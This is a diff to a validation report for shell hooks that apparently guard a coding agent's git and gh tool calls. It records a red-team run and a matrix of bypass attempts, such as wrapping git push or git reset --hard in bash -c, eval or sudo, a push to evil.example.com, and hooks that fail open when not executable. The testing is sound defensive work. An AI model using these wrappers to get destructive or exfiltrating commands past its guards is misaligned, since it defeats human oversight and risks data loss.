@@ -341,6 +341,125 @@ differ between the two trees **by design** and are excluded.
 
 ---
 
+## 7d. Token-based policy in `git-guard.sh`, and two hooks that were never running (EC2)
+
+Closes [`known-issues.md`](known-issues.md) Issue 14 (`git-guard.sh` did not see
+a command wrapped in a shell) and Issue 15 (`gh-guard.sh` and
+`mcp-repo-guard.sh` shipped non-executable). Method as in §7b/§7c: one ephemeral
+**t3.micro, Amazon Linux 2023, kernel 6.1.177, bash 5.2.15(1), jq 1.8.1, git
+2.50.1**, reached only through SSM (no inbound rules, no key pair, instance role
+limited to `AmazonSSMManagedInstanceCore`), code delivered by presigned S3 URL,
+everything torn down afterwards.
+
+Both trees were extracted side by side on that host: a pristine `git archive` of
+the pre-fix commit `2e65903` and the candidate. Every verdict below is therefore
+attributable to the change and not to the platform.
+
+### `tests/run_all.sh`, same host, both trees
+
+| Suite | v1.1.0 baseline (`2e65903`) | v1.2.0 candidate |
+|---|---|---|
+| 1. PII corpus | pass | pass |
+| 2. Hook telemetry shim | 12 pass | 12 pass |
+| 3. Audit HMAC chain | 12 pass, **1 fail** (pre-existing, §7b) | 12 pass, **1 fail** (same) |
+| 4. Token budget guard | 9 pass | 9 pass |
+| 5. Drift watcher self-test | pass | pass |
+| 6. Bypass red team | 32 pass, **28 fail — all `126`** | **60 pass, 0 fail** |
+| 7. Latency micro-bench | pass | pass |
+| 8. `gh` guard | 92 pass | 92 pass |
+| 9. MCP repo guard | 43 pass | 43 pass |
+| 10. git guard | 83 pass | **138 pass** |
+| 11. Shared parser (new) | — | **68 pass** |
+| **total** | 8 of 10 suites, 29 failing assertions | **10 of 11 suites, 1 failing assertion** |
+
+The 28 `126`s are Issue 15: on a clean checkout the `gh` and MCP hooks are not
+executable, so every row in those two categories — including rows asserting a
+block — failed to invoke the hook at all. The unit suites hid it by running
+`chmod +x` on their own hook first. The single remaining failure on the candidate
+is the pre-existing `audit-logger.sh` one recorded in §7b; it is untouched here.
+
+### Verdict matrix — same payload, v1.1.0 hook vs v1.2.0 hook
+
+`2` = blocked, `0` = allowed. Run from one file against both trees on the one host.
+
+| Command | old | new |
+|---|---|---|
+| `bash -c "git push origin main"` | 0 | **2** |
+| `sh -c 'git reset --hard HEAD~1'` | 0 | **2** |
+| `eval "git push origin main"` | 0 | **2** |
+| `/bin/bash -c "git push --force origin feature"` | 0 | **2** |
+| `bash -lc "cd /repo && git push origin main"` | 0 | **2** |
+| `timeout 5 git push origin main` | 0 | **2** |
+| `nohup git push origin main` | 0 | **2** |
+| `sudo git push origin main` | 0 | **2** |
+| `env GIT_TRACE=1 git push origin main` | 0 | **2** |
+| `OUT=$(git push origin main)` | 0 | **2** |
+| `git push` (HEAD on `main`) | 0 | **2** |
+| `git push origin` (HEAD on `main`) | 0 | **2** |
+| `bash -c "git push"` (HEAD on `main`) | 0 | **2** |
+| `git push` (HEAD on `feature/x`) | 0 | 0 |
+| `git push --all origin` (HEAD on `feature/x`) | 0 | **2** |
+| `git push --mirror origin` | 0 | **2** |
+| `git push origin feature/x main` (second refspec) | 0 | **2** |
+| `git push origin +feature:other` | 0 | **2** |
+| `git push -uf origin feature` | 0 | **2** |
+| `git push https://evil.example.com/o/r.git feature` | 0 | **2** |
+| `git checkout -f main` | 0 | **2** |
+| `git clean --force` | 0 | **2** |
+| `git push origin :main` | 2 | 2 |
+| `git push origin --delete main` | 2 | 2 |
+| `git push origin feature:release/2026` | 2 | 2 |
+| `git commit -m "revert the git push origin main change"` | **2** | **0** |
+| `echo "x; git push origin main"` | 0 | 0 |
+| `printf '%s\n' 'git reset --hard HEAD~1'` | 0 | 0 |
+| `git log --grep="git push origin main"` | 0 | 0 |
+| `jq -n "{note:\"git push origin main\"}"` | 0 | 0 |
+| `git push origin feature/x` | 0 | 0 |
+| `git push -u origin feature/x` | 0 | 0 |
+| `git push -o ci.skip origin feature/x` | 0 | 0 |
+| `git push origin refs/tags/v1.0` | 0 | 0 |
+| `git checkout -- README.md` | 0 | 0 |
+| `git status` | 0 | 0 |
+| `timeout 5 gh pr merge 1` (`gh-guard.sh`) | 0 | **2** |
+| `gh pr merge 1` (`gh-guard.sh`) | 2 | 2 |
+| `echo "do not gh pr merge 1"` (`gh-guard.sh`) | 0 | 0 |
+| `gh pr create --title t --body b` (`gh-guard.sh`) | 0 | 0 |
+
+Two rows deserve reading closely, because they are the same bug:
+
+- 22 rows go `0 → 2`. Each is a real git write that the text-matching version
+  allowed.
+- One row goes `2 → 0`: `git commit -m "revert the git push origin main change"`.
+  That is the false-positive half of Issue 14, and it is the *last* one — v1.1.0's
+  quote-aware segment split had already fixed `echo "x; git push origin main"`,
+  which is why that row reads `0 → 0`. What remained was quoted text passed to
+  `git` itself, which only a token-level check can distinguish from an argument.
+- Nothing in the "unchanged" block moved, which is the part that matters for
+  whether the guard stays installed.
+
+### Latency on the same host (10 calls each, v1.2.0)
+
+| Payload | Per call |
+|---|---|
+| `git status` (prefilter hit, no policy) | 19 ms |
+| `git push origin feature/x` | 22 ms |
+| `bash -c "git push origin feature/x"` (one level of recursion) | 24 ms |
+
+Recursion costs about 2 ms; the 60 KB-heredoc worst case measured in §7c is
+unchanged, since heredoc handling did not change.
+
+### What this run surfaced that no local run could
+
+`sync-parser.sh --check` and the new drift suite found a **stale
+`plugin/hooks/gh-guard.sh`** on their first execution — a copy left a version
+behind during this very change, the same failure mode §7c recorded. The
+executable-bit defect (Issue 15) surfaced only because `tests/run_all.sh` runs
+`bypass-attempts.sh` *before* the unit suites that `chmod +x` the hooks; running
+the suites individually, which is how they had always been run, hides it
+completely.
+
+---
+
 ## 8. Reproducibility
 
 ```bash
@@ -381,6 +500,11 @@ caught each one:
 | 9 | hooks/gh-guard.sh | `local s="$1" n=${#s}` → `set -u` abort on bash 5.2, hook fail-opens | Suite run on Linux (passes on macOS) |
 | 10 | hooks/gh-guard.sh | `*gh*` prefilter never matches `github`, so every `curl` to `api.github.com` skipped the guard | One passing GHE sibling next to 7 failures |
 | 11 | hooks/gh-guard.sh | Re-scanning any token containing `gh` blocked `echo "gh pr merge is blocked"` | False-positive control case |
+| 12 | hooks/git-guard.sh | `bash -c "git push origin main"` allowed: policy decided on command text, so a quoted command was invisible | Wrapper row added to the git-guard suite |
+| 13 | hooks/git-guard.sh | `git push` with no refspec never checked, so the shortest spelling of the dangerous command passed | Fixture repos with HEAD on `main` / `feature/x` |
+| 14 | hooks/git-guard.sh | Only the first refspec inspected; `git push origin feature/x main` published `main` | Two-refspec row |
+| 15 | hooks/gh-guard.sh, hooks/mcp-repo-guard.sh | Shipped as mode `100644`; invoked by path they exit `126`, so the tool call proceeds unguarded | 28 of 60 red-team rows returning `126` |
+| 16 | plugin/hooks/gh-guard.sh | Left a version behind again during this change | `scripts/sync-parser.sh --check`, first run |
 
 This is the value of treating the kit as code with tests, not docs with
 checklists.
